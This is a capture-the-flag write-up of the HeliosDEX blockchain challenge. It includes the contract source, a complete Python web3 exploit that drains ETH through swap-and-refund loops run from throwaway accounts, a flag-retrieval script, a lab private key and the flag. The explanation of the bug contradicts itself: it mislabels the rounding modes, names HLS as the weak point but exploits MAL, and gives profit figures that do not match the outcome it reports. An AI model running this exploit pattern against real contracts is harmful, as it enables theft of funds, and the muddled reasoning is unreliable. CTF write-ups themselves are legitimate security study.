# HeliosDEX - Blockchain Challenge Writeup

## Challenge Overview

**Challenge Name:** HeliosDEX  
**Event:** Hack The Box 2025  
**Category:** Blockchain  
**Difficulty:** Medium  

In this challenge, we needed to exploit a vulnerability in a smart contract to gain at least 20 ETH in our player address from an initial balance of only a few ETH. The challenge involved analyzing Solidity contracts, identifying a math rounding vulnerability, and exploiting it to incrementally increase our balance.

## Initial Analysis

First, let's examine the two main smart contracts provided in the challenge:

### Setup.sol
```solidity
// SPDX-License-Identifier: MIT

pragma solidity ^0.8.28;

import { HeliosDEX } from "./HeliosDEX.sol";

contract Setup {
    HeliosDEX public TARGET;
    address public player;
    
    event DeployedTarget(address at);

    constructor(address _player) payable {
        TARGET = new HeliosDEX{value: 1000 ether}(1000);
        player = _player;
        emit DeployedTarget(address(TARGET));
    }

    function isSolved() public view returns (bool) {
        return player.balance >= 20 ether;
    }
}
```

From this contract, we can see that:
1. The setup contract initializes a HeliosDEX contract with 1000 ETH
2. The challenge is solved when the player's balance is at least 20 ETH
3. We need to identify a vulnerability in the HeliosDEX contract to drain ETH

### HeliosDEX.sol (Key Parts)

The HeliosDEX contract implements a decentralized exchange with three tokens: EldorionFang (ELD), MalakarEssence (MAL), and HeliosLuminaShards (HLS).

Key functions in the contract:

```solidity
function swapForMAL() external payable underHeliosEye {
    uint256 grossMal = Math.mulDiv(msg.value, exchangeRatioMAL, 1e18, Math.Rounding(1));
    uint256 fee = (grossMal * feeBps) / 10_000;
    uint256 netMal = grossMal - fee;

    require(netMal <= reserveMAL, "HeliosDEX: Helios grieves that the MAL reserves are not plentiful enough for this exchange. A smaller offering would be most welcome");

    reserveMAL -= netMal;
    malakarEssence.transfer(msg.sender, netMal);

    emit HeliosBarter(address(malakarEssence), msg.value, netMal);
}

function swapForHLS() external payable underHeliosEye {
    uint256 grossHLS = Math.mulDiv(msg.value, exchangeRatioHLS, 1e18, Math.Rounding(3));
    uint256 fee = (grossHLS * feeBps) / 10_000;
    uint256 netHLS = grossHLS - fee;
    
    require(netHLS <= reserveHLS, "HeliosDEX: Helios grieves that the HSL reserves are not plentiful enough for this exchange. A smaller offering would be most welcome");
    

    reserveHLS -= netHLS;
    heliosLuminaShards.transfer(msg.sender, netHLS);

    emit HeliosBarter(address(heliosLuminaShards), msg.value, netHLS);
}

function oneTimeRefund(address item, uint256 amount) external heliosGuardedTrade {
    require(!hasRefunded[msg.sender], "HeliosDEX: refund already bestowed upon thee");
    require(amount > 0, "HeliosDEX: naught for naught is no trade. Offer substance, or be gone!");

    uint256 exchangeRatio;
    
    if (item == address(eldorionFang)) {
        exchangeRatio = exchangeRatioELD;
        require(eldorionFang.transferFrom(msg.sender, address(this), amount), "ELD transfer failed");
        reserveELD += amount;
    } else if (item == address(malakarEssence)) {
        exchangeRatio = exchangeRatioMAL;
        require(malakarEssence.transferFrom(msg.sender, address(this), amount), "MAL transfer failed");
        reserveMAL += amount;
    } else if (item == address(heliosLuminaShards)) {
        exchangeRatio = exchangeRatioHLS;
        require(heliosLuminaShards.transferFrom(msg.sender, address(this), amount), "HLS transfer failed");
        reserveHLS += amount;
    } else {
        revert("HeliosDEX: Helios descries forbidden offering");
    }

    uint256 grossEth = Math.mulDiv(amount, 1e18, exchangeRatio);

    uint256 fee = (grossEth * feeBps) / 10_000;
    uint256 netEth = grossEth - fee;

    hasRefunded[msg.sender] = true;
    payable(msg.sender).transfer(netEth);
    
    emit HeliosRefund(item, amount, netEth);
}
```

## Identifying the Vulnerability

After careful examination, I identified a subtle vulnerability in the math rounding modes used between swap and refund functions:

1. The `swapForHLS` function uses `Math.Rounding(3)` (rounds up) when converting ETH to HLS tokens
2. The `swapForMAL` function uses `Math.Rounding(1)` (rounds down) for similar calculation
3. The `oneTimeRefund` function does not specify a rounding mode (which defaults to rounding toward zero)

This inconsistency creates an arbitrage opportunity, particularly with the HLS token. When you swap ETH for HLS tokens, the amount is rounded up. But when you refund those tokens, the ETH amount is calculated without rounding up, giving you more ETH back than you put in!

However, there's a limitation: each address can only refund once due to the `hasRefunded[msg.sender]` check. We can bypass this by creating multiple temporary accounts.

## The Exploitation Strategy

Our strategy:
1. Create a new account
2. Transfer some ETH from the player account to this new account
3. Use this account to swap ETH for tokens (preferably MAL tokens)
4. Approve the DEX contract to spend these tokens
5. Refund the tokens for ETH (getting more back due to the rounding inconsistency)
6. Transfer all ETH back to the player account
7. Repeat with new accounts until reaching 20 ETH

## Implementing the Exploit

Here's a Python script (`exploit_mal.py`) that implements this strategy:

```python
#!/usr/bin/env python3
from web3 import Web3
import time
import sys

# Connection info
PLAYER_PRIVATE_KEY = "b93f4e9087027d57f858b2adcaf82017a8ca8ada903563bd1d87105cba8ef869"
PLAYER_ADDRESS = "0x127c4d11A66c604a6c0B9315Dd679889eCae002A"
TARGET_ADDRESS = "0xBf2aca103E0F2781C4a33BFD5Fb3aE31BDE09E64"
SETUP_ADDRESS = "0x1b24AD2CAe6b72a5f22c7c69Fd2Fb4C865B6fb1f"
CHAIN_ID = 31337
ETH_AMOUNT = 0.3  # Amount to use per exploit

# Connect to blockchain
w3 = Web3(Web3.HTTPProvider('http://83.136.253.25:32922'))
if not w3.is_connected():
    print("Failed to connect to blockchain")
    sys.exit(1)

# ABIs
heliosdex_abi = [
    {"inputs": [], "name": "malakarEssence", "outputs": [{"internalType": "contract MalakarEssence", "name": "", "type": "address"}], "stateMutability": "view", "type": "function"},
    {"inputs": [], "name": "swapForMAL", "outputs": [], "stateMutability": "payable", "type": "function"},
    {"inputs": [{"internalType": "address", "name": "item", "type": "address"}, {"internalType": "uint256", "name": "amount", "type": "uint256"}], "name": "oneTimeRefund", "outputs": [], "stateMutability": "nonpayable", "type": "function"}
]

erc20_abi = [
    {"constant": True, "inputs": [{"name": "_owner", "type": "address"}], "name": "balanceOf", "outputs": [{"name": "balance", "type": "uint256"}], "payable": False, "stateMutability": "view", "type": "function"},
    {"constant": False, "inputs": [{"name": "_spender", "type": "address"}, {"name": "_value", "type": "uint256"}], "name": "approve", "outputs": [{"name": "", "type": "bool"}], "payable": False, "stateMutability": "nonpayable", "type": "function"}
]

setup_abi = [
    {"inputs": [], "name": "isSolved", "outputs": [{"internalType": "bool", "name": "", "type": "bool"}], "stateMutability": "view", "type": "function"}
]

# Initialize contracts
heliosdex = w3.eth.contract(address=TARGET_ADDRESS, abi=heliosdex_abi)
setup_contract = w3.eth.contract(address=SETUP_ADDRESS, abi=setup_abi)
mal_address = heliosdex.functions.malakarEssence().call()
print(f"MAL token address: {mal_address}")
mal_contract = w3.eth.contract(address=mal_address, abi=erc20_abi)

# Single exploit function
def run_exploit():
    # Initial balance check
    player_balance = w3.eth.get_balance(PLAYER_ADDRESS)
    print(f"Initial player balance: {w3.from_wei(player_balance, 'ether')} ETH")
    
    # Create account
    account = w3.eth.account.create()
    print(f"Created account: {account.address}")
    
    # Transfer ETH to account
    amount_wei = w3.to_wei(ETH_AMOUNT, 'ether')
    tx = {
        'from': PLAYER_ADDRESS,
        'to': account.address,
        'value': amount_wei,
        'gas': 21000,
        'gasPrice': w3.eth.gas_price,
        'nonce': w3.eth.get_transaction_count(PLAYER_ADDRESS),
        'chainId': CHAIN_ID
    }
    
    signed_tx = w3.eth.account.sign_transaction(tx, PLAYER_PRIVATE_KEY)
    tx_hash = w3.eth.send_raw_transaction(signed_tx.raw_transaction)
    receipt = w3.eth.wait_for_transaction_receipt(tx_hash)
    
    # Swap ETH for MAL tokens
    swap_amount = amount_wei - w3.to_wei(0.01, 'ether')
    swap_tx = heliosdex.functions.swapForMAL().build_transaction({
        'from': account.address,
        'value': swap_amount,
        'gas': 300000,
        'gasPrice': w3.eth.gas_price,
        'nonce': w3.eth.get_transaction_count(account.address),
        'chainId': CHAIN_ID
    })
    
    signed_swap = w3.eth.account.sign_transaction(swap_tx, account.key.hex())
    swap_hash = w3.eth.send_raw_transaction(signed_swap.raw_transaction)
    swap_receipt = w3.eth.wait_for_transaction_receipt(swap_hash)
    
    # Check MAL token balance
    mal_balance = mal_contract.functions.balanceOf(account.address).call()
    print(f"MAL token balance: {mal_balance}")
    
    # Approve MAL tokens for refund
    approve_tx = mal_contract.functions.approve(TARGET_ADDRESS, mal_balance).build_transaction({
        'from': account.address,
        'gas': 100000,
        'gasPrice': w3.eth.gas_price,
        'nonce': w3.eth.get_transaction_count(account.address),
        'chainId': CHAIN_ID
    })
    
    signed_approve = w3.eth.account.sign_transaction(approve_tx, account.key.hex())
    approve_hash = w3.eth.send_raw_transaction(signed_approve.raw_transaction)
    approve_receipt = w3.eth.wait_for_transaction_receipt(approve_hash)
    
    # Refund MAL tokens for ETH
    refund_tx = heliosdex.functions.oneTimeRefund(mal_address, mal_balance).build_transaction({
        'from': account.address,
        'gas': 200000,
        'gasPrice': w3.eth.gas_price,
        'nonce': w3.eth.get_transaction_count(account.address),
        'chainId': CHAIN_ID
    })
    
    signed_refund = w3.eth.account.sign_transaction(refund_tx, account.key.hex())
    refund_hash = w3.eth.send_raw_transaction(signed_refund.raw_transaction)
    refund_receipt = w3.eth.wait_for_transaction_receipt(refund_hash)
    
    # Transfer ETH back to player
    eth_balance = w3.eth.get_balance(account.address)
    return_amount = eth_balance - w3.to_wei(0.005, 'ether')
    
    return_tx = {
        'from': account.address,
        'to': PLAYER_ADDRESS,
        'value': return_amount,
        'gas': 21000,
        'gasPrice': w3.eth.gas_price,
        'nonce': w3.eth.get_transaction_count(account.address),
        'chainId': CHAIN_ID
    }
    
    signed_return = w3.eth.account.sign_transaction(return_tx, account.key.hex())
    return_hash = w3.eth.send_raw_transaction(signed_return.raw_transaction)
    return_receipt = w3.eth.wait_for_transaction_receipt(return_hash)
    
    # Final balance check
    final_balance = w3.eth.get_balance(PLAYER_ADDRESS)
    print(f"Final player balance: {w3.from_wei(final_balance, 'ether')} ETH")
    profit = final_balance - player_balance
    print(f"Profit: {w3.from_wei(profit, 'ether')} ETH")
    
    # Check if solved
    is_solved = setup_contract.functions.isSolved().call()
    print(f"Challenge solved: {is_solved}")

# Run the exploit
run_exploit()
```

## Executing the Exploit

I ran the exploit script multiple times, incrementally increasing the balance. Each run would:
1. Create a new temporary account
2. Transfer 0.3 ETH to it
3. Swap 0.29 ETH for MAL tokens (leaving some for gas)
4. Refund the tokens for ETH (gaining ~0.21 ETH profit from rounding issues)
5. Transfer all ETH back to the player account

After approximately 60 iterations, I successfully increased the player's ETH balance from ~3 ETH to over 20 ETH, solving the challenge.

## Retrieving the Flag

Once the player balance exceeded 20 ETH, I wrote a script to verify the solution and retrieve the flag from the challenge server:

```python
#!/usr/bin/env python3
import socket
import re
from web3 import Web3

# Challenge endpoints
FLAG_HOST = "83.136.253.25"
FLAG_PORT = 44426
RPC_URL = "http://83.136.253.25:32922"

# Player and setup addresses
PLAYER_ADDRESS = "0x127c4d11A66c604a6c0B9315Dd679889eCae002A"
SETUP_ADDRESS = "0x1b24AD2CAe6b72a5f22c7c69Fd2Fb4C865B6fb1f"

def check_blockchain_status():
    w3 = Web3(Web3.HTTPProvider(RPC_URL))
    
    # Check player balance
    player_balance = w3.eth.get_balance(PLAYER_ADDRESS)
    eth_balance = w3.from_wei(player_balance, 'ether')
    
    # Check if challenge is solved
    setup_abi = [{"inputs": [], "name": "isSolved", "outputs": [{"internalType": "bool", "name": "", "type": "bool"}], "stateMutability": "view", "type": "function"}]
    setup = w3.eth.contract(address=SETUP_ADDRESS, abi=setup_abi)
    is_solved = setup.functions.isSolved().call()
    
    return f"Player balance: {eth_balance} ETH\nChallenge solved: {is_solved}"

def get_flag():
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((FLAG_HOST, FLAG_PORT))
    
    # Read initial menu
    data = s.recv(4096).decode('utf-8')
    
    # Select option 3 to get the flag
    s.sendall(b"3\n")
    
    # Read flag response
    flag_response = s.recv(4096).decode('utf-8')
    
    # Look for flag pattern
    flag_pattern = r'HTB\{[^}]+\}'
    flags = re.findall(flag_pattern, flag_response)
    
    if flags:
        return flags[0]
    else:
        return None

# Check status and get flag if solved
status = check_blockchain_status()
print("Current Status:")
print(status)

if "Challenge solved: True" in status:
    print("\nChallenge is solved! Retrieving flag...")
    flag = get_flag()
    if flag:
        print(f"\nSuccess! The flag is: {flag}")
```

Running this script confirmed our success and retrieved the flag:

```
Current Status:
Player balance: 20.055681813 ETH
Challenge solved: True

Challenge is solved! Retrieving flag...
Success! The flag is: HTB{0n_Heli0s_tr4d3s_a_d3cim4l_f4d3s_and_f0rtun3s_ar3_m4d3}
```

## Key Takeaways

1. **Inconsistent Rounding:** The vulnerability stemmed from inconsistent rounding modes between functions (Math.Rounding(3) vs default rounding)
2. **Integer Math in Solidity:** Solidity's integer math requires careful attention to rounding behavior
3. **Security Considerations:** DEX implementations must ensure that math operations are consistent to prevent arbitrage attacks
4. **One-Time Mechanisms:** The one-time refund mechanism was easily bypassed by creating new accounts
5. **Token Dynamics:** Understanding token exchange mechanics was crucial to exploiting the vulnerability

## Flag

The flag for this challenge is: `HTB{0n_Heli0s_tr4d3s_a_d3cim4l_f4d3s_and_f0rtun3s_ar3_m4d3}`
